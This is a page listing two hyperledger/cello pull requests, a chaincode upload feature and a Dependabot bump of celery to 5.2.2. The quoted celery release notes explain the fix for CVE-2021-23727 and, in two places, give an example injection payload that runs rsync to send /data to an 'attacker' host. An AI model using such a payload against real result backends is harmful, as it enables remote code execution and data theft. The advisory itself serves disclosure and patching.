---
layout: default
title: cello
parent: Hyperledger
grand_parent: Pull Requests
has_children: false
permalink: /pull-requests/hyperledger/cello
---

# cello <span class="fs-3 right-align">[GitHub](https://github.com/hyperledger/cello){: .btn .mr-4 }</span>


<div>
    <table>
        <tr>
            <td>
                PR <a href="https://github.com/hyperledger/cello/pull/369" class=".btn">#369</a>
            </td>
            <td>
                <b>
                    [#issue-368] chaincode files upload
                </b>
            </td>
        </tr>
        <tr>
            <td>
                
            </td>
            <td>
                The interface of chain code upload is added. Temporarily save the chain code in the / opt / chaincode / {MD5} directory. In the future, consider making the package function in an interface?

Close #issue-368

Signed-off-by: tianxuanhong1 <523713078@qq.com>
            </td>
        </tr>
    </table>
    <div class="right-align">
        Created At 2022-01-08 00:55:07 +0000 UTC
    </div>
</div>

<div>
    <table>
        <tr>
            <td>
                PR <a href="https://github.com/hyperledger/cello/pull/367" class=".btn">#367</a>
            </td>
            <td>
                <b>
                    Bump celery from 4.2.1 to 5.2.2 in /src/api-engine
                </b>
            </td>
        </tr>
        <tr>
            <td>
                <span class="chip">Dependencies</span><span class="chip">python</span>
            </td>
            <td>
                Bumps [celery](https://github.com/celery/celery) from 4.2.1 to 5.2.2.
<details>
<summary>Release notes</summary>
<p><em>Sourced from <a href="https://github.com/celery/celery/releases">celery's releases</a>.</em></p>
<blockquote>
<h2>5.2.2</h2>
<p>Release date: 2021-12-26 16:30 P.M UTC+2:00</p>
<p>Release by: Omer Katz</p>
<ul>
<li>
<p>Various documentation fixes.</p>
</li>
<li>
<p>Fix CVE-2021-23727 (Stored Command Injection security
vulnerability).</p>
<blockquote>
<p>When a task fails, the failure information is serialized in the
backend. In some cases, the exception class is only importable
from the consumer's code base. In this case, we reconstruct the
exception class so that we can re-raise the error on the process
which queried the task's result. This was introduced in <a href="https://github-redirect.dependabot.com/celery/celery/issues/4836">#4836</a>. If
the recreated exception type isn't an exception, this is a
security issue. Without the condition included in this patch, an
attacker could inject a remote code execution instruction such as:
<code>os.system(&quot;rsync /data attacker@192.168.56.100:~/data&quot;)</code> by
setting the task's result to a failure in the result backend with
the os, the system function as the exception type and the payload
<code>rsync /data attacker@192.168.56.100:~/data</code> as the exception
arguments like so:</p>
<pre lang="python"><code>{
      &quot;exc_module&quot;: &quot;os&quot;,
      'exc_type': &quot;system&quot;,
      &quot;exc_message&quot;: &quot;rsync /data attacker@192.168.56.100:~/data&quot;
}
</code></pre>
<p>According to my analysis, this vulnerability can only be exploited
if the producer delayed a task which runs long enough for the
attacker to change the result mid-flight, and the producer has
polled for the task's result. The attacker would also have to
gain access to the result backend. The severity of this security
vulnerability is low, but we still recommend upgrading.</p>
</blockquote>
</li>
</ul>
<h2>v5.2.1</h2>
<p>Release date: 2021-11-16 8.55 P.M UTC+6:00</p>
<p>Release by: Asif Saif Uddin</p>
<ul>
<li>Fix rstrip usage on bytes instance in ProxyLogger.</li>
<li>Pass logfile to ExecStop in celery.service example systemd file.</li>
<li>fix: reduce latency of AsyncResult.get under gevent (<a href="https://github-redirect.dependabot.com/celery/celery/issues/7052">#7052</a>)</li>
<li>Limit redis version: &lt;4.0.0.</li>
<li>Bump min kombu version to 5.2.2.</li>
<li>Change pytz&gt;dev to a PEP 440 compliant pytz&gt;0.dev.0.</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Changelog</summary>
<p><em>Sourced from <a href="https://github.com/celery/celery/blob/master/Changelog.rst">celery's changelog</a>.</em></p>
<blockquote>
<h1>5.2.2</h1>
<p>:release-date: 2021-12-26 16:30 P.M UTC+2:00
:release-by: Omer Katz</p>
<ul>
<li>
<p>Various documentation fixes.</p>
</li>
<li>
<p>Fix CVE-2021-23727 (Stored Command Injection security vulnerability).</p>
<p>When a task fails, the failure information is serialized in the backend.
In some cases, the exception class is only importable from the
consumer's code base. In this case, we reconstruct the exception class
so that we can re-raise the error on the process which queried the
task's result. This was introduced in <a href="https://github-redirect.dependabot.com/celery/celery/issues/4836">#4836</a>.
If the recreated exception type isn't an exception, this is a security issue.
Without the condition included in this patch, an attacker could inject a remote code execution instruction such as:
<code>os.system(&quot;rsync /data attacker@192.168.56.100:~/data&quot;)</code>
by setting the task's result to a failure in the result backend with the os,
the system function as the exception type and the payload <code>rsync /data attacker@192.168.56.100:~/data</code> as the exception arguments like so:</p>
<p>.. code-block:: python</p>
<pre><code>  {
        &quot;exc_module&quot;: &quot;os&quot;,
        'exc_type': &quot;system&quot;,
        &quot;exc_message&quot;: &quot;rsync /data attacker@192.168.56.100:~/data&quot;
  }
</code></pre>
<p>According to my analysis, this vulnerability can only be exploited if
the producer delayed a task which runs long enough for the
attacker to change the result mid-flight, and the producer has
polled for the task's result.
The attacker would also have to gain access to the result backend.
The severity of this security vulnerability is low, but we still
recommend upgrading.</p>
</li>
</ul>
<p>.. _version-5.2.1:</p>
<h1>5.2.1</h1>
<p>:release-date: 2021-11-16 8.55 P.M UTC+6:00
:release-by: Asif Saif Uddin</p>
<ul>
<li>Fix rstrip usage on bytes instance in ProxyLogger.</li>
<li>Pass logfile to ExecStop in celery.service example systemd file.</li>
<li>fix: reduce latency of AsyncResult.get under gevent (<a href="https://github-redirect.dependabot.com/celery/celery/issues/7052">#7052</a>)</li>
<li>Limit redis version: &lt;4.0.0.</li>
<li>Bump min kombu version to 5.2.2.</li>
</ul>
<!-- raw HTML omitted -->
</blockquote>
<p>... (truncated)</p>
</details>
<details>
<summary>Commits</summary>
<ul>
<li><a href="https://github.com/celery/celery/commit/b21c13d234dd6d6c197436374ab1bb5db4be62c7"><code>b21c13d</code></a> Bump version: 5.2.1 → 5.2.2</li>
<li><a href="https://github.com/celery/celery/commit/a60b4867f4bd4efa4b5a2834fcf3f757740b1b8f"><code>a60b486</code></a> Add changelog for 5.2.2.</li>
<li><a href="https://github.com/celery/celery/commit/3e5d630f478518eb775c05ba87b29024400fbe68"><code>3e5d630</code></a> Fix changelog formatting.</li>
<li><a href="https://github.com/celery/celery/commit/1f7ad7e6df1e02039b6ab9eec617d283598cad6b"><code>1f7ad7e</code></a> Fix CVE-2021-23727 (Stored Command Injection securtiy vulnerability).</li>
<li><a href="https://github.com/celery/celery/commit/2d8dbc2a8087bbb60590465031ebd5138b8eb359"><code>2d8dbc2</code></a> Update configuration.rst</li>
<li><a href="https://github.com/celery/celery/commit/9596abad9060323d85d3945d8637b3cafadfefa2"><code>9596aba</code></a> Fix typo in documentation</li>
<li><a href="https://github.com/celery/celery/commit/639ad83239a1f9cfc58ee9852a1f107f96d3c1a1"><code>639ad83</code></a> update doc to reflect Celery 5.2.x (<a href="https://github-redirect.dependabot.com/celery/celery/issues/7153">#7153</a>)</li>
<li><a href="https://github.com/celery/celery/commit/d32356c0e46eefecd164c55899f532c2fed2df57"><code>d32356c</code></a> Bump version: 5.2.0 → 5.2.1</li>
<li><a href="https://github.com/celery/celery/commit/6842a786eeeb2d0f1fcd66408b72924b39e07836"><code>6842a78</code></a> Merge branch 'master' of <a href="https://github.com/celery/celery">https://github.com/celery/celery</a></li>
<li><a href="https://github.com/celery/celery/commit/4c92cb745f658382a4eb4b94ba7938d119168165"><code>4c92cb7</code></a> changelog for v5.2.1</li>
<li>Additional commits viewable in <a href="https://github.com/celery/celery/compare/v4.2.1...v5.2.2">compare view</a></li>
</ul>
</details>
<br />


[![Dependabot compatibility score](https://dependabot-badges.githubapp.com/badges/compatibility_score?dependency-name=celery&package-manager=pip&previous-version=4.2.1&new-version=5.2.2)](https://docs.github.com/en/github/managing-security-vulnerabilities/about-dependabot-security-updates#about-compatibility-scores)

Dependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.

[//]: # (dependabot-automerge-start)
[//]: # (dependabot-automerge-end)

---

<details>
<summary>Dependabot commands and options</summary>
<br />

You can trigger Dependabot actions by commenting on this PR:
- `@dependabot rebase` will rebase this PR
- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it
- `@dependabot merge` will merge this PR after your CI passes on it
- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it
- `@dependabot cancel merge` will cancel a previously requested merge and block automerging
- `@dependabot reopen` will reopen this PR if it is closed
- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually
- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)
- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)
- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language
- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language
- `@dependabot use these assignees` will set the current assignees as the default for future PRs for this repo and language
- `@dependabot use this milestone` will set the current milestone as the default for future PRs for this repo and language

You can disable automated security fix PRs for this repo from the [Security Alerts page](https://github.com/hyperledger/cello/network/alerts).

</details>
            </td>
        </tr>
    </table>
    <div class="right-align">
        Created At 2022-01-06 22:30:19 +0000 UTC
    </div>
</div>

